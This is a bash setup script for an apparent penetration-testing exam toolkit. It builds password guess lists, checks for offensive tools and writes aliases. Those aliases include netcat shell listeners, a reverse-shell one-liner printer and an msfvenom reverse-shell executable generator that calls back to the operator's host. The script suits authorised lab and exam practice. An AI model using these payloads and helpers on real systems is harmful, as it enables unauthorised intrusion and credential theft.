#!/usr/bin/env bash
# setup.sh — bootstrap the exam-day toolkit on Kali.
# Idempotent: safe to run more than once. Run from the toolkit root:  bash setup.sh
# What it does: makes loot dirs, builds trimmed wordlists, checks tools, writes handy aliases.
set -uo pipefail

TOOLKIT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$TOOLKIT_DIR"

c_g(){ printf '\033[32m%s\033[0m\n' "$*"; }   # green
c_y(){ printf '\033[33m%s\033[0m\n' "$*"; }   # yellow
c_r(){ printf '\033[31m%s\033[0m\n' "$*"; }   # red

echo "=============================================="
c_g " PTD exam toolkit — setup"
echo " dir: $TOOLKIT_DIR"
echo "=============================================="

# ---------------------------------------------------------------------------
# 1) Directory scaffold
# ---------------------------------------------------------------------------
c_y "[*] Creating working directories..."
mkdir -p loot wordlists payloads scripts cheatsheets
# per-engagement loot subdirs
mkdir -p loot/nmap loot/screenshots loot/creds
c_g "    loot/ wordlists/ payloads/ scripts/ ready."

# ---------------------------------------------------------------------------
# 1b) Install apt dependencies (tuned for the exam base image). SKIP_APT=1 to skip.
# ---------------------------------------------------------------------------
if [ "${SKIP_APT:-0}" = "1" ]; then
  c_y "[*] SKIP_APT=1 — skipping apt dependency install."
else
  c_y "[*] Installing apt dependencies (uses sudo; run 'SKIP_APT=1 bash setup.sh' to skip)..."
  bash "$TOOLKIT_DIR/scripts/install-deps.sh" || c_r "    [-] install-deps hit errors (see above); continuing."
fi

# ---------------------------------------------------------------------------
# 2) Trimmed wordlists (SPEED: top-N rockyou + pattern list)
# ---------------------------------------------------------------------------
c_y "[*] Building trimmed wordlists..."

ROCKYOU=""
for p in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz \
         /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt; do
  [ -f "$p" ] && ROCKYOU="$p" && break
done

if [ -n "$ROCKYOU" ]; then
  if [[ "$ROCKYOU" == *.gz ]]; then
    zcat "$ROCKYOU" 2>/dev/null | head -n 250  > wordlists/rockyou-top250.txt
    zcat "$ROCKYOU" 2>/dev/null | head -n 1000 > wordlists/rockyou-top1000.txt
  else
    head -n 250  "$ROCKYOU" > wordlists/rockyou-top250.txt
    head -n 1000 "$ROCKYOU" > wordlists/rockyou-top1000.txt
  fi
  c_g "    rockyou-top250.txt ($(wc -l < wordlists/rockyou-top250.txt) lines) + top1000 from $ROCKYOU"
else
  c_r "    rockyou.txt not found — install 'wordlists' pkg or drop it in /usr/share/wordlists/"
  c_r "    (sudo apt install wordlists  &&  sudo gunzip /usr/share/wordlists/rockyou.txt.gz)"
fi

# season / pattern passwords (regenerated each run)
YEAR="$(date +%Y)"; LAST=$((YEAR-1))
cat > wordlists/season-pattern.txt <<EOF
Summer${YEAR}!
Winter${YEAR}!
Spring${YEAR}!
Autumn${YEAR}!
Summer${LAST}!
Winter${LAST}!
Spring${LAST}!
Autumn${LAST}!
Password1!
Password123!
Welcome1!
Welcome${YEAR}!
Changeme1!
Changeme123!
Admin123!
Qwerty123!
Company${YEAR}!
EOF
c_g "    season-pattern.txt ($(wc -l < wordlists/season-pattern.txt) lines, year=$YEAR)"

# ---------------------------------------------------------------------------
# 3) Tool check — what's installed, what's missing
# ---------------------------------------------------------------------------
c_y "[*] Checking tools..."
# NOTE: certutil is a Windows/target-side LOLbin (not a Kali tool) — not checked here.
#       crackmapexec was renamed to netexec (nxc), which IS in the list.
NEED=(nmap smbclient enum4linux-ng nxc gobuster hydra medusa \
      hashcat john hashid searchsploit msfvenom msfconsole nc rlwrap \
      evil-winrm sqsh impacket-mssqlclient snmpwalk whatweb curl wget \
      python3 impacket-smbserver)
MISSING=()
for t in "${NEED[@]}"; do
  if command -v "$t" >/dev/null 2>&1; then
    printf '    \033[32m[+]\033[0m %s\n' "$t"
  else
    printf '    \033[31m[-]\033[0m %s (missing)\n' "$t"
    MISSING+=("$t")
  fi
done

# RDP client: FreeRDP 2 provides `xfreerdp`, FreeRDP 3 (current Kali) provides `xfreerdp3`.
if command -v xfreerdp >/dev/null 2>&1; then
  printf '    \033[32m[+]\033[0m %s\n' "xfreerdp"
elif command -v xfreerdp3 >/dev/null 2>&1; then
  printf '    \033[32m[+]\033[0m %s\n' "xfreerdp3"
  c_y "        tip: symlink so cheat-sheet 'xfreerdp ...' commands work as written:"
  c_y "        sudo ln -sf \"\$(command -v xfreerdp3)\" /usr/local/bin/xfreerdp"
else
  printf '    \033[31m[-]\033[0m %s\n' "xfreerdp/xfreerdp3 (missing — sudo apt install -y freerdp3-x11)"
  MISSING+=("freerdp3-x11")
fi

if [ "${#MISSING[@]}" -gt 0 ]; then
  c_y "    Missing: ${MISSING[*]}"
  c_y "    Install common ones: sudo apt install -y nmap smbclient hydra medusa hashcat john \\"
  c_y "      gobuster rlwrap evil-winrm freerdp3-x11 snmp whatweb netexec seclists exploitdb"
  c_y "    netexec(nxc): pipx install netexec   |   enum4linux-ng: pipx install enum4linux-ng"
fi

# ---------------------------------------------------------------------------
# 4) Binary fetch reminder (offline-stage these BEFORE exam — no internet rules vary)
# ---------------------------------------------------------------------------
if [ ! -f payloads/SigmaPotato.exe ]; then
  c_y "[!] payloads/ is missing privesc binaries. Run:  bash scripts/fetch-binaries.sh"
  c_y "    (do this at home with internet; the exam box may be offline-restricted)"
fi

# ---------------------------------------------------------------------------
# 5) Aliases + helper functions
# ---------------------------------------------------------------------------
c_y "[*] Writing aliases to ./aliases.sh  (run:  source aliases.sh)"
cat > aliases.sh <<'ALIASES'
# PTD exam aliases — source me:   source aliases.sh
# Set your target; LHOST is auto-detected from the route to it:
#   sett 10.1.1.5          # RHOST (target) + LHOST (auto, source IP toward the target)
#   seti eth0              # override LHOST from an interface  (or: export LHOST=10.1.1.9)
export TOOLKIT="$(cd "$(dirname "${BASH_SOURCE[0]:-.}")" && pwd)"

sett(){ export RHOST="$1"; export LHOST="$(ip -4 route get "$1" 2>/dev/null | grep -oP 'src \K[0-9.]+')"; echo "RHOST=$RHOST  LHOST=${LHOST:-<unset: run  seti <iface>>}"; }
seti(){ export LHOST="$(ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"; echo "LHOST=$LHOST"; }
vars(){ echo "RHOST=${RHOST:-<unset>}  LHOST=${LHOST:-<unset>}"; }

# recon  (recon() = the big port-agnostic script; nmapfast/nmapsvc = quick manual nmap)
recon(){ bash "$TOOLKIT/scripts/recon.sh" "${1:-$RHOST}"; }                                # recon [ip]  full thorough recon
alias nmapfast='nmap -Pn -n -T3 -p- --open -oN loot/nmap/allports.txt'                      # nmapfast $RHOST
nmapsvc(){ nmap -Pn -n -T3 -sV -sC -p "$1" -oN loot/nmap/services.txt "${2:-$RHOST}"; }     # nmapsvc 21,80 [ip]

# target services — ALL take the REAL port (services can be on odd ports; recon tells you which)
smbnull(){ smbclient -L "//$RHOST" -N ${1:+-p "$1"}; }                                      # smbnull [port]  list shares
smap(){ smbmap -H "$RHOST" ${1:+-P "$1"}; }                                                 # smap [port]     R/W access
web(){ local p="${1:?usage: web <port> [path]}"; local u="http://$RHOST:$p${2:-}"; echo "[*] $u"; whatweb -a3 "$u"; curl -sSIk --max-time 15 "$u"; gobuster dir -u "$u" -w /usr/share/wordlists/dirb/common.txt -t 10 -x php,txt,html,asp,aspx; }   # web <port>  quick enum (any port)
gob(){ local p="${1:?usage: gob <port> [wordlist]}"; gobuster dir -u "http://$RHOST:$p" -w "${2:-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt}" -t 10 -x php,txt,html,asp,aspx; }   # gob <port>  deep dirs
fuzz(){ ffuf -w "${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}" -u "${1:?usage: fuzz <url-with-FUZZ> [wordlist]}" -ac; }   # fuzz 'http://$RHOST:PORT/pg?FUZZ=x'
rdp(){ xfreerdp3 /u:"${1:?user}" /p:"${2:?pass}" /v:"$RHOST:${3:-3389}" /cert:ignore +clipboard /dynamic-resolution; }   # rdp <user> <pass> [port]
winrm(){ evil-winrm -i "$RHOST" -u "${1:?user}" -p "${2:?pass}" ${3:+-P "$3"}; }            # winrm <user> <pass> [port]
ssql(){ impacket-mssqlclient "${1:?user}":"${2:?pass}"@"$RHOST" -p "${3:-1433}"; }          # ssql <user> <pass> [port]

# evidence — wrap ANY manual command to print it + tee its output to loot/ (for screenshots)
ev(){ echo "+ $*"; "$@" 2>&1 | tee -a "$TOOLKIT/loot/manual-${RHOST:-target}.log"; }         # ev nmap -sV ...

# serve files / listeners  (fixed infra ports — these are YOURS, not the target's)
alias serve='python3 -m http.server 8081'          # run inside payloads/
alias smbserve='impacket-smbserver share "$(pwd)" -smb2support'
alias l4='rlwrap nc -lvnp 4444'                     # foothold catch
alias l5='rlwrap nc -lvnp 5555'                     # privesc/SYSTEM catch
alias l6='rlwrap nc -lvnp 6666'                     # spare / exfil

# win reverse-shell one-liner (prints it with your LHOST baked in). Usage: winrev [port] (default 4444).
# ip-tolerant: a stray leading IP (winrev $RHOST 4444) is ignored and the 2nd arg used as the port.
winrev(){ local p="${1:-4444}"; case "$1" in *.*.*.*) p="${2:-4444}";; esac; cat "$TOOLKIT/payloads/reverse-shells.txt" 2>/dev/null \
  | sed "s/LHOST/${LHOST}/g; s/PORT/${p}/g" | sed -n '1,40p'; }

# quick msfvenom exe (does NOT count as the one MSF use)
venexe(){ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT="${1:-4444}" -f exe -o "payloads/rev${1:-4444}.exe" && echo "-> payloads/rev${1:-4444}.exe"; }

echo "aliases loaded. Flow:  sett <target> ; recon ; <enumerate> ; l4 ; winrev 4444 ; whoami /priv"
echo "  (seti <iface> overrides LHOST · service helpers take the real port: web/gob/smbnull/rdp/winrm/ssql · ev <cmd> saves evidence)"
ALIASES
c_g "    aliases.sh written."

# ---------------------------------------------------------------------------
# 6) loot .gitignore (don't commit exam-day evidence by accident)
# ---------------------------------------------------------------------------
[ -f loot/.gitignore ] || cat > loot/.gitignore <<'GI'
# ignore everything in loot/ (exam-day scratch) except this file
*
!.gitignore
GI

echo "=============================================="
c_g " Setup complete."
echo "  Next:  source aliases.sh ;  sett <target> ;  seti <iface> ;  vars"
echo "  Stage binaries (at home):  bash scripts/fetch-binaries.sh"
echo "  Drive from:  cheatsheets/00-KILLCHAIN.md"
echo "=============================================="
